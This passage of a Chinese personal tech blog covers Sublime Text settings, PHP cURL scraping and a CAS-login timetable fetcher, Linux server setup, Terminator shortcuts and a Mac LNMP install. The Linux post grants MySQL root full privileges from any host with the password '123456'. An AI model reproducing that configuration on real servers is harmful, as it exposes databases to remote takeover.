<p>显示全路径<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line"><span class="attr">"show_full_path":</span> <span class="literal">true</span>  </div></pre></td></tr></table></figure>  </p>
<p>user下的设置<br><figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line">&#123;</div><div class="line">    <span class="attr">"font_size"</span>: <span class="number">17</span>,</div><div class="line">    <span class="attr">"highlight_line"</span>: <span class="literal">true</span>,</div><div class="line">    <span class="attr">"show_full_path"</span>: <span class="literal">true</span>,</div><div class="line">    <span class="attr">"ignored_packages"</span>:</div><div class="line">    [</div><div class="line">        <span class="string">"Vintage"</span></div><div class="line">    ],</div><div class="line">    <span class="attr">"rulers"</span>:</div><div class="line">    [</div><div class="line">        <span class="number">80</span></div><div class="line">    ],</div><div class="line">    <span class="attr">"bold_folder_labels"</span>: <span class="literal">true</span>,</div><div class="line">    <span class="attr">"save_on_focus_lost"</span>: <span class="literal">true</span>,</div><div class="line">    <span class="attr">"scroll_past_end"</span>: <span class="literal">true</span>,</div><div class="line">    <span class="attr">"show_encoding"</span>: <span class="literal">true</span>,</div><div class="line">    <span class="attr">"show_line_endings"</span>: <span class="literal">true</span>,</div><div class="line">    <span class="attr">"tab_size"</span>: <span class="number">2</span>,</div><div class="line">    <span class="attr">"translate_tabs_to_spaces"</span>: <span class="literal">true</span>,</div><div class="line">    <span class="attr">"trim_trailing_white_space_on_save"</span>: <span class="literal">true</span></div><div class="line">&#125; </div></pre></td></tr></table></figure>  </p>
<h2 id="三、各种插件推荐"><a href="#三、各种插件推荐" class="headerlink" title="三、各种插件推荐"></a>三、各种插件推荐</h2><p>1、Emmet  </p>
<p>2、Color Highlighter&amp;&amp;Color Picker  </p>
<p>3、Prettify  </p>
<p>4、ConvertToUTF8  </p>
<p>5、SublimeTmpl  </p>
<p>6、sublimeLinter  </p>
<p>7、Sublime CodeIntel  </p>
<p>8、git  </p>
<p>9、GitGutter  </p>
<p>10、Terminal  </p>
]]></content>
      
        <categories>
            
            <category> Tools </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Sublime Text </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[在PHP中使用cURL]]></title>
      <url>/2015/11/02/PHP/cURL/</url>
      <content type="html"><![CDATA[<p>cURL（Client URL Library Functions）is a command line tool for transferring data with URL syntax<br><a id="more"></a><br>1、可以使用 <code>php -i | grep cURL</code> 查看是否安装cURL<br>2、初始化cURL curl_init()<br>3、向服务器发送请求  curl_exec()<br>4、接收服务器数据 curl_exec()<br>5、关闭cURL curl_close()  </p>
<h2 id="一、简单的网页爬虫"><a href="#一、简单的网页爬虫" class="headerlink" title="一、简单的网页爬虫"></a>一、简单的网页爬虫</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></div><div class="line">$curl = curl_init(<span class="string">"http://www.baidu.com"</span>);  </div><div class="line">curl_exec($curl);  </div><div class="line">curl_close($curl);  </div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line">php -f **.php &gt; baidu.html   </div></pre></td></tr></table></figure>  
<h2 id="二、抓取网页信息并替换"><a href="#二、抓取网页信息并替换" class="headerlink" title="二、抓取网页信息并替换"></a>二、抓取网页信息并替换</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">  </div><div class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></div><div class="line">$curl = curl_init();  </div><div class="line">curl_setopt($curl,CURLOPT_URL,<span class="string">"http://www.baidu.com"</span>);  </div><div class="line">curl_setopt($curl,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>);<span class="comment">//执行后不打印  </span></div><div class="line">$output = curl_exec($curl);</div><div class="line">curl_close($curl);</div><div class="line"><span class="keyword">echo</span> str_replace(<span class="string">"百度"</span>,<span class="string">"谷歌"</span>,$output);</div><div class="line"><span class="meta">?&gt;</span>  </div></pre></td></tr></table></figure>  
<h2 id="三、调用WebService查天气"><a href="#三、调用WebService查天气" class="headerlink" title="三、调用WebService查天气"></a>三、调用WebService查天气</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></div><div class="line">$data = <span class="string">'theCityName=北京'</span>;  </div><div class="line">$curlobj = curl_init();	  </div><div class="line">curl_setopt($curlobj, CURLOPT_URL, <span class="string">"http://www.webxml.com.cn/WebServices/WeatherWebService.asmx/getWeatherbyCityName"</span>);    </div><div class="line">curl_setopt($curlobj, CURLOPT_HEADER, <span class="number">0</span>); </div><div class="line">curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);  </div><div class="line">curl_setopt($curlobj, CURLOPT_POST, <span class="number">1</span>);    </div><div class="line">curl_setopt($curlobj, CURLOPT_POSTFIELDS, $data);    </div><div class="line">curl_setopt($curlobj, CURLOPT_HTTPHEADER, <span class="keyword">array</span>(<span class="string">"application/x-www-form-urlencoded; charset=utf-8"</span>,   </div><div class="line">	<span class="string">"Content-length: "</span>.strlen($data)  </div><div class="line">	));  </div><div class="line">curl_setopt ($curl, CURLOPT_USERAGENT,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]); </div><div class="line">$rtn = curl_exec($curlobj);     </div><div class="line"><span class="keyword">if</span>(!curl_errno($curlobj))&#123;  </div><div class="line">	<span class="comment">// $info = curl_getinfo($curlobj);   </span></div><div class="line">	<span class="comment">// print_r($info);  </span></div><div class="line">	<span class="keyword">echo</span> $rtn;    </div><div class="line">&#125; <span class="keyword">else</span> &#123;  </div><div class="line">  <span class="keyword">echo</span> <span class="string">'Curl error: '</span> . curl_error($curlobj);</div><div class="line">&#125;    </div><div class="line">curl_close($curlobj);  </div><div class="line"><span class="meta">?&gt;</span>  </div></pre></td></tr></table></figure>  
<h2 id="四、抓课表"><a href="#四、抓课表" class="headerlink" title="四、抓课表"></a>四、抓课表</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line">	  </div><div class="line">$username = <span class="string">''</span>;</div><div class="line">     $pwd = md5(<span class="string">''</span>);</div><div class="line">     </div><div class="line">     <span class="comment">//获取lt动态字符串</span></div><div class="line">     $url = <span class="string">"http://cas.hdu.edu.cn/cas/login"</span>;  <span class="comment">//登陆界面</span></div><div class="line">     $ch = curl_init();</div><div class="line">     curl_setopt($ch, CURLOPT_URL, $url);</div><div class="line">     curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); <span class="comment">//不显示头</span></div><div class="line">     curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);  <span class="comment">//不显示</span></div><div class="line">     $data = curl_exec($ch);</div><div class="line">     curl_close($ch);</div><div class="line">     $pattern = <span class="string">'/name="lt" value="(.*?)"/'</span>;</div><div class="line">     preg_match_all($pattern, $data, $matches); <span class="comment">//正则取出value值</span></div><div class="line">     $lt = $matches[<span class="number">1</span>][<span class="number">0</span>];</div><div class="line"></div><div class="line">     <span class="comment">//设置post的数据</span></div><div class="line">     $post = <span class="keyword">array</span> (</div><div class="line">         <span class="string">'username'</span> =&gt; $username,</div><div class="line">         <span class="string">'password'</span>  =&gt; $pwd,</div><div class="line">         <span class="string">'encodedService'</span>  =&gt; <span class="string">'http%3a%2f%2fi.hdu.edu.cn%2fdcp%2findex.jsp'</span>,</div><div class="line">         <span class="string">'service'</span>  =&gt;  <span class="string">'http://i.hdu.edu.cn/dcp/index.jsp'</span>,</div><div class="line">         <span class="string">'serviceName'</span>  =&gt; <span class="string">'null'</span>,</div><div class="line">         <span class="string">'loginErrCnt'</span>  =&gt; <span class="string">'0'</span>,</div><div class="line">         <span class="string">'lt'</span>  =&gt; $lt,</div><div class="line">     );</div><div class="line"></div><div class="line">     <span class="comment">//登陆获取cookie并抓取js中的跳转url</span></div><div class="line">     $url = <span class="string">"http://cas.hdu.edu.cn/cas/login"</span>;</div><div class="line">     $ch = curl_init();</div><div class="line">     curl_setopt($ch, CURLOPT_URL, $url);</div><div class="line">     curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</div><div class="line">     curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</div><div class="line">     curl_setopt($ch, CURLOPT_POST, <span class="number">1</span>);</div><div class="line">     curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post));</div><div class="line">     curl_setopt($ch, CURLOPT_COOKIEJAR, <span class="string">'cookiefile'</span>);</div><div class="line">     <span class="comment">//curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookiefile');</span></div><div class="line">     $data = curl_exec($ch);</div><div class="line">     curl_close($ch);</div><div class="line">     $pattern = <span class="string">'/href="(.*?)"/'</span>;</div><div class="line">     preg_match_all($pattern, $data, $matches);</div><div class="line">     $url = $matches[<span class="number">1</span>][<span class="number">0</span>];</div><div class="line"></div><div class="line">     <span class="comment">//通过url获取cookie</span></div><div class="line">     $ch = curl_init();</div><div class="line">     curl_setopt($ch, CURLOPT_URL, $url);</div><div class="line">     curl_setopt($ch,CURLOPT_HEADER,<span class="number">0</span>);</div><div class="line">     curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</div><div class="line">     curl_setopt($ch, CURLOPT_COOKIEJAR, <span class="string">'cookiefile'</span>);</div><div class="line">     <span class="comment">//curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookiefile');</span></div><div class="line">     $data = curl_exec($ch);</div><div class="line">     curl_close($ch);</div><div class="line">     <span class="comment">// echo $data;</span></div><div class="line"></div><div class="line">     $url = <span class="string">'http://i.hdu.edu.cn/dcp/xphone/kbcx0.jsp'</span>;</div><div class="line">     $ch = curl_init($url);</div><div class="line">     curl_setopt($ch,CURLOPT_HEADER,<span class="number">0</span>);</div><div class="line">     curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</div><div class="line">     curl_setopt($ch, CURLOPT_HTTPHEADER, <span class="keyword">array</span>(<span class="string">"Referer:http://cas.hdu.edu.cn/cas/login"</span>));</div><div class="line">     curl_setopt($ch, CURLOPT_COOKIEFILE, <span class="string">'cookiefile'</span>);</div><div class="line">     $data = curl_exec($ch);</div></pre></td></tr></table></figure>  ]]></content>
      
        <categories>
            
            <category> PHP </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PHP </tag>
            
            <tag> cURL </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[linux服务器的操作]]></title>
      <url>/2015/10/17/Linux/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      <content type="html"><![CDATA[<p>搞了一台阿里云的服务器，centos下的预装了nginx+mysql+php。<br>基本上是在mac下的iTerm中操作<br><a id="more"></a></p>
<h2 id="一、SSH连接"><a href="#一、SSH连接" class="headerlink" title="一、SSH连接"></a>一、SSH连接</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line"><span class="symbol">ssh</span> -l 用户名 <span class="built_in">ip</span>地址  </div></pre></td></tr></table></figure>  
<h2 id="二、创建普通用户"><a href="#二、创建普通用户" class="headerlink" title="二、创建普通用户"></a>二、创建普通用户</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line"><span class="keyword">adduser </span>用户名  </div><div class="line"><span class="symbol">passwd</span> 用户名  </div></pre></td></tr></table></figure>  
<h2 id="三、查看账号信息"><a href="#三、查看账号信息" class="headerlink" title="三、查看账号信息"></a>三、查看账号信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line"><span class="built_in">cd</span> /alidata  </div></pre></td></tr></table></figure>  
<h2 id="四、创建站点"><a href="#四、创建站点" class="headerlink" title="四、创建站点"></a>四、创建站点</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line">cd /alidata/www  </div><div class="line">mkdir sitename</div><div class="line">在sitename下创建一个index<span class="selector-class">.html</span></div><div class="line">cd /alidata/server/nginx/conf/vhosts</div><div class="line">cp default<span class="selector-class">.conf</span> sitename<span class="selector-class">.conf</span></div><div class="line">mv default<span class="selector-class">.conf</span> default<span class="selector-class">.conf</span><span class="selector-class">.bak</span></div><div class="line">vim sitename<span class="selector-class">.conf</span></div><div class="line">修改servername,root</div><div class="line">修改完之后对nginx进行重启</div><div class="line">/alidata/server/nginx/sbin/nginx -s reload </div></pre></td></tr></table></figure>
<h2 id="五、修改hostname"><a href="#五、修改hostname" class="headerlink" title="五、修改hostname"></a>五、修改hostname</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line">vim <span class="regexp">/etc/</span>sysconfig<span class="regexp">/network  </span></div></pre></td></tr></table></figure>
<h2 id="六、数据库远程连接权限设置"><a href="#六、数据库远程连接权限设置" class="headerlink" title="六、数据库远程连接权限设置"></a>六、数据库远程连接权限设置</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">在服务器内部登录mysql  </div><div class="line"><span class="keyword">grant</span> all <span class="keyword">privileges</span> <span class="keyword">on</span> *.* <span class="keyword">to</span> <span class="string">'root'</span>@<span class="string">'%'</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'123456'</span> <span class="keyword">with</span> <span class="keyword">grant</span> <span class="keyword">option</span>;   </div></pre></td></tr></table></figure>
<p><em>.</em> 第一个<em>是指数据库  
</em>代表所有数据库<br>第二个<em>指数据库对象  
</em>代表数据库中所有对象<br> ‘root’@’%’ root是制定要授权的数据库用户<br>%代表允许登录的IP<br>123456是你的数据库密码  </p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Terminator多窗口终端的快捷键]]></title>
      <url>/2015/09/12/Linux/Terminator/</url>
      <content type="html"><![CDATA[<p>The following keybindings can be used to control Terminator:<br>Ctrl+Shift+O<br>Split terminals Horizontally.（上下开新窗口）<br><a id="more"></a><br>Ctrl+Shift+E<br>Split terminals Vertically.（垂直开新窗口）<br>Ctrl+Shift+Right<br>Move parent dragbar Right.（放大当前窗口 向右）<br>Ctrl+Shift+Left<br>Move parent dragbar Left.<br>Ctrl+Shift+Up<br>Move parent dragbar Up.<br>Ctrl+Shift+Down<br>Move parent dragbar Down.<br>Ctrl+Shift+S<br>Hide/Show Scrollbar.（隐藏滚动条）<br>Ctrl+Shift+F<br>Search within terminal scrollback<br>Ctrl+Shift+N or Ctrl+Tab<br>Move to next terminal within the same tab, use Ctrl+PageDown to move to the next tab.<br>If cycle_term_tab is False, cycle within the same tab will be disabled<br>Ctrl+Shift+P or Ctrl+Shift+Tab<br>Move to previous terminal within the same tab, use Ctrl+PageUp to move to the previous tab. If cycle_term_tab is False, cycle within the same tab will be disabled<br>Alt+Up<br>Move to the terminal above the current one.（切换当前窗口）<br>Alt+Down<br>Move to the terminal below the current one.<br>Alt+Left<br>Move to the terminal left of the current one.<br>Alt+Right<br>Move to the terminal right of the current one.<br>Ctrl+Shift+C<br>Copy selected text to clipboard<br>Ctrl+Shift+V<br>Paste clipboard text<br>Ctrl+Shift+W<br>Close the current terminal.<br>Ctrl+Shift+Q<br>Quits Terminator<br>Ctrl+Shift+X （最大化当前窗口）<br>Toggle between showing all terminals and only showing the current one (maximise).<br>Ctrl+Shift+Z<br>Toggle between showing all terminals and only showing a scaled version of the current one (zoom).<br>Ctrl+Shift+T<br>Open new tab<br>Ctrl+Shift+Alt+T<br>Open new tab at root level, if using extreme_tabs.<br>Ctrl+PageDown<br>Move to next Tab<br>Ctrl+PageUp<br>Move to previous Tab<br>Ctrl+Shift+PageDown<br>Swap tab position with next Tab<br>Ctrl+Shift+PageUp<br>Swap tab position with previous Tab<br>Ctrl+Shift+F<br>Open buffer search bar to find substrings in the scrollback buffer. Hit Escape to cancel.<br>Ctrl+Plus (+)<br>Increase font size. Note: this may require you to press shift, depending on your keyboard<br>Ctrl+Minus (-)<br>Decrease font size. Note: this may require you to press shift, depending on your keyboard<br>Ctrl+Zero (0)<br>Restore font size to original setting.<br>F11<br>Toggle fullscreen（放大当前窗口）<br>Ctrl+Shift+R<br>Reset terminal state<br>Ctrl+Shift+G<br>Reset terminal state and clear windowUbuntu terminator<br>多窗口终端的快捷键  </p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Kali </tag>
            
            <tag> Terminal </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Mac Yosemite 安装Lnmp环境]]></title>
      <url>/2015/09/11/Mac/Mnmp/</url>
      <content type="html"><![CDATA[<p>1、php安装<br>2、mysql安装<br>3、nginx安装  </p>
<a id="more"></a>
<h2 id="一、PHP-FPM"><a href="#一、PHP-FPM" class="headerlink" title="一、PHP-FPM"></a>一、PHP-FPM</h2><p>Because Homebrew doesn’t have a default formula for PHP-FPM, we need need to add this first:<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">brew </span>tap homebrew/dupes</div><div class="line"><span class="keyword">brew </span>tap homebrew/versions</div><div class="line"><span class="keyword">brew </span>tap homebrew/php</div></pre></td></tr></table></figure></p>
<p>Now install it with the following arguments:<br><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">brew</span> <span class="comment">install</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">without</span><span class="literal">-</span><span class="comment">apache</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">with</span><span class="literal">-</span><span class="comment">fpm</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">with</span><span class="literal">-</span><span class="comment">mysql</span> <span class="comment">php56</span></div></pre></td></tr></table></figure></p>
<p>Homebrew is downloading now the PHP-FPM source code and compiling it for you. Give it some time, it can take several minutes.  </p>
<p>If you want to use the PHP command line binary, you need to update the $PATH environment variable of your shell profile:<br><figure class="highlight dos"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> 'export <span class="built_in">PATH</span>="/usr/local/sbin:$<span class="built_in">PATH</span>"' &gt;&gt; ~/.zshrc</div></pre></td></tr></table></figure></p>
<p>Create a folder for our LaunchAgents and symlink the start/stop service:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mkdir -<span class="selector-tag">p</span> ~/Library/LaunchAgents</div><div class="line">ln -sfv /usr/local/opt/php56/homebrew<span class="selector-class">.mxcl</span><span class="selector-class">.php56</span><span class="selector-class">.plist</span> ~/Library/LaunchAgents/</div></pre></td></tr></table></figure></p>
<p>And start PHP-FPM:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">launchctl load -w ~/Library/LaunchAgents/homebrew<span class="selector-class">.mxcl</span><span class="selector-class">.php56</span><span class="selector-class">.plist</span></div></pre></td></tr></table></figure></p>
<p>Make sure PHP-FPM is listening on port 9000:<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">lsof -Pni4 | grep LISTEN | grep php</div><div class="line">php-fpm   <span class="number">69659</span>  frdmn    6u  IPv4 <span class="number">0x8d8ebe505a1ae01</span>      <span class="number">0t0</span>  TCP <span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>:<span class="number">9000</span> (LISTEN)</div><div class="line">php-fpm   <span class="number">69660</span>  frdmn    0u  IPv4 <span class="number">0x8d8ebe505a1ae01</span>      <span class="number">0t0</span>  TCP <span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>:<span class="number">9000</span> (LISTEN)</div><div class="line">php-fpm   <span class="number">69661</span>  frdmn    0u  IPv4 <span class="number">0x8d8ebe505a1ae01</span>      <span class="number">0t0</span>  TCP <span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>:<span class="number">9000</span> (LISTEN)</div><div class="line">php-fpm   <span class="number">69662</span>  frdmn    0u  IPv4 <span class="number">0x8d8ebe505a1ae01</span>      <span class="number">0t0</span>  TCP <span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>:<span class="number">9000</span> (LISTEN)    </div></pre></td></tr></table></figure></p>
<h2 id="二、MySQL"><a href="#二、MySQL" class="headerlink" title="二、MySQL"></a>二、MySQL</h2><p>Next step is to install MySQL:<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">brew </span><span class="keyword">install </span>mysql</div></pre></td></tr></table></figure> </p>
<p>And start the database server:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql<span class="selector-class">.server</span> start</div></pre></td></tr></table></figure></p>
<p>To seure our MySQL server, we’ll exececute the provided secure_mysql_installation binary to change the root password, remove anonymous users and disbale remote root logins:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql_secure_installation</div></pre></td></tr></table></figure></p>
<p>Test connection<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">mysql -uroot -p</span></div></pre></td></tr></table></figure></p>
<h2 id="三、Nginx"><a href="#三、Nginx" class="headerlink" title="三、Nginx"></a>三、Nginx</h2><p>Install Nginx<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">brew </span><span class="keyword">install </span>nginx</div></pre></td></tr></table></figure></p>
<p>Config default.conf<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">cd</span> /usr/local/etc/nginx/</div><div class="line">mkdir conf.d</div><div class="line">vim ./conf.d/default.conf</div><div class="line">server &#123;</div><div class="line">    <span class="attribute">listen</span>       <span class="number">8080</span>;</div><div class="line">    <span class="attribute">server_name</span>  localhost;</div><div class="line"></div><div class="line">    <span class="attribute">root</span> /Users/user_name/nginx_sites/; <span class="comment"># 该项要修改为你准备存放相关网页的路径</span></div><div class="line"></div><div class="line">    <span class="attribute">location</span> / &#123; </div><div class="line">        <span class="attribute">index</span> index.php;</div><div class="line">        <span class="attribute">autoindex</span> <span class="literal">on</span>; </div><div class="line">    &#125;   </div><div class="line">    <span class="comment">#proxy the php scripts to php-fpm  </span></div><div class="line">    <span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</div><div class="line">        <span class="attribute">include</span> /usr/local/etc/nginx/fastcgi.conf;</div><div class="line">        <span class="attribute">fastcgi_intercept_errors</span> <span class="literal">on</span>; </div><div class="line">        <span class="attribute">fastcgi_pass</span>   <span class="number">127.0.0.1:9000</span>; </div><div class="line">    &#125;   </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>Config nginx.conf<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">cd</span> /usr/local/etc/nginx/</div><div class="line">vim nginx.conf</div><div class="line">worker_processes  <span class="number">1</span>;  </div><div class="line"></div><div class="line"><span class="attribute">error_log</span>       /usr/local/var/log/nginx/error.log <span class="literal">warn</span>;</div><div class="line"></div><div class="line"><span class="attribute">pid</span>        /usr/local/var/run/nginx.pid;</div><div class="line"></div><div class="line"><span class="section">events</span> &#123;</div><div class="line">    <span class="attribute">worker_connections</span>  <span class="number">256</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="section">http</span> &#123;</div><div class="line">    <span class="attribute">include</span>       mime.types;</div><div class="line">    <span class="attribute">default_type</span>  application/octet-stream;</div><div class="line"></div><div class="line">    <span class="attribute">log_format</span>  main  <span class="string">'<span class="variable">$remote_addr</span> - <span class="variable">$remote_user</span> [<span class="variable">$time_local</span>] "<span class="variable">$request</span>" '</span></div><div class="line">                      <span class="string">'<span class="variable">$status</span> <span class="variable">$body_bytes_sent</span> "<span class="variable">$http_referer</span>" '</span></div><div class="line">                      <span class="string">'"<span class="variable">$http_user_agent</span>" "<span class="variable">$http_x_forwarded_for</span>"'</span>;</div><div class="line"></div><div class="line">    <span class="attribute">access_log</span>      /usr/local/var/log/nginx/access.log main;</div><div class="line">    <span class="attribute">port_in_redirect</span> <span class="literal">off</span>;</div><div class="line">    <span class="attribute">sendfile</span>        <span class="literal">on</span>; </div><div class="line">    <span class="attribute">keepalive_timeout</span>  <span class="number">65</span>; </div><div class="line"></div><div class="line">    <span class="attribute">include</span> /usr/local/etc/nginx/conf.d/<span class="regexp">*.conf</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>Setup auto start<br><figure class="highlight coq"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">  </div><div class="line">sudo cp -v /usr/local/opt/nginx/*.plist /<span class="keyword">Library</span>/LaunchDaemons/</div><div class="line">sudo chown root:wheel /<span class="keyword">Library</span>/LaunchDaemons/homebrew.mxcl.nginx.plist</div><div class="line">sudo launchctl load /<span class="keyword">Library</span>/LaunchDaemons/homebrew.mxcl.nginx.plist</div></pre></td></tr></table></figure></p>
<p>Test<br>在之前nginx配置文件default.conf中设置的root项对应的文件夹下创建测试文件index.php:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">  </div><div class="line"><span class="php"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span></div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> Mac </category>
            
        </categories>
